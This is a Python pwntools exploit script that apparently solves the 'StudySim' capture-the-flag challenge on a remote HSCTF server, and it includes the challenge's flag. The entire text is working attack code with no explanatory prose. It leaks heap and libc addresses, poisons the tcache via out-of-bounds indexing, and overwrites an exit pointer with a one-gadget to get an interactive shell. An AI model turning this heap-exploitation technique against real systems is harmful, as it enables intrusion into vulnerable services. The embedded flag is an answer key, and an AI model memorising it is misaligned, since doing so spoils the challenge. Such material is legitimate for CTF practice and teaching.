#exploit for StudySim
#flag=flag{57udy1n6_c0mpl373_fr33_unn3c3554ry_7b676886}
from pwn import *
libc=ELF('/media/sf_kalishared/livectfs/RCTF2020/note/libc-2.29.so')
target=remote('pwn.hsctf.com', 5007)
chunkarray=0x404060
stdoutptr=0x404020
def add(size,data):
	print(target.recvuntil("> "))
	target.sendline("add")
	print(target.recvuntil("sheet?\n"))
	target.sendline(str(size))
	print(target.recvuntil("sheet?\n"))
	target.send(data)
	print(target.recvuntil("\'"))
	leak=target.recvuntil("\'").strip("\'")[0:6]
	libc_leak=u64(leak+"\x00"*(8-len(leak)))
	print(target.recvline())
	return libc_leak
def do(n):
	print(target.recvuntil("> "))
	target.sendline("do")
	print(target.recvuntil("finish?\n"))
	target.sendline(str(n))
	print(target.recvuntil("Only "))
	leak=target.recvuntil(" ").strip(" ")
	(hex(int(leak)))
	print(target.recvline())
	return int(leak)
def sleep():
	print(target.recvuntil("> "))
	target.sendline("sleep")
do(4)
add(0x1,"A")
heap_p=do(0)-1
heap_off=0x250
heap_base=heap_p-heap_off
heap_tcache_head=heap_base+0xb0
heap_tcache_head2=heap_base+0xa8
do(heap_off+heap_base+1-(heap_tcache_head-chunkarray)/8)
add(0xef,p64(stdoutptr)+"\n")
do(1+(heap_tcache_head-chunkarray)/8)
add(0xef,"\n")
libc_stdout=add(0xef,"\n")
libc_base=libc_stdout-libc.symbols["_IO_2_1_stdout_"]
gadget=0xe237f
libc_gadget=libc_base+gadget
exitoff=0xe3d1f70-0xe1b9000
libc_exitoff=libc_base+exitoff
do(2-(heap_tcache_head2-chunkarray)/8)
add(0xdf,p64(libc_exitoff)+"\n")
add(0xdf,"B"+"\n")
add(0xdf,p64(libc_gadget)+"\n")
sleep()
target.interactive()


